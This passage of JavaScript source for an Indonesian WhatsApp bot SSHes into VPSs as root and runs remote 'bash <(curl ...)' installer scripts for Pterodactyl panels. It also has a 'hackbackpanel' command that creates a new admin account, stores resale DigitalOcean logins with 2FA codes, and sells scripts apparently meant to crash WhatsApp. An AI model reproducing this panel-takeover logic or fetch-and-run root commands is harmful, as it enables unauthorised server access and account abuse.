await reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return reply(msg.owner);
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const XuuSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
reply('Katasandi atau IP tidak valid')
}).connect(XuuSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const XuuSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(XuuSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Xuu.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("primexuu|ipserver"))
if (!text.split("|")) return reply(example("primexuu|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V12`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return reply(`${e['error']}`)
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("primexuu@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return reply(example("primexuu@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return reply(example("primexuu@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("cmd|responnya"))
if (!text.split("|")) return reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addakses": case "addaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
const input = m.chat
if (premium.includes(input)) return reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return reply(`Id ${input} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return reply("Tidak ada id channel di database")
if (!text) return reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
Xuu.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break


case "buyscript": case "buysc": {
if (m.isGroup) return reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'AXONIC V10', 
                  description: "Rp30.000", 
                  id: '.buysc 7'
                },
                {
                  title: 'AXONIC 9.0', 
                  description: "Rp25.000", 
                  id: '.buysc 1'
                },
                {
                  title: 'AXONIC 8.0', 
                  description: "Rp20.000", 
                  id: '.buysc 2'
                },
                {
                  title: 'Web Portfolio', 
                  description: "Rp20.000", 
                  id: '.buysc 3'
                },
                {
                  title: 'Script Obf Tele', 
                  description: "Rp15.000", 
                  id: '.buysc 4'
                },
                {
                  title: 'AMBA Crash V3', 
                  description: "Rp25.000", 
                  id: '.buysc 5'
                },
                {
                  title: 'Death Flow V1', 
                  description: "Rp40.000", 
                  id: '.buysc 6'
                },
                {
                  title: 'Web API OrderKuota', 
                  description: "Rp35.000", 
                  id: '.buysc 7'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Script AXONIC 9.0"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script AXONIC 8.0"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Web Portfolio" 
    } else if (tek == "4") {
    Obj.file = "./source/media/script4.zip"
    Obj.harga = "15000"
    Obj.namaSc = "Script Obf Via Tele"  
    } else if (tek == "5") {
    Obj.file = "./source/media/script5.zip"
    Obj.harga = "25000"
    Obj.namaSc = "AMBA Crash V3" 
    } else if (tek == "6") {
    Obj.file = "./source/media/script6.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Death Flow V1"  
    } else if (tek == "7") {
    Obj.file = "./source/media/script7.zip"
    Obj.harga = "30000"
    Obj.namaSc = "AXONIC V10"  
    } else if (tek == "8") {
    Obj.file = "./source/media/script8.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Web API OrderKuota"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});

db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

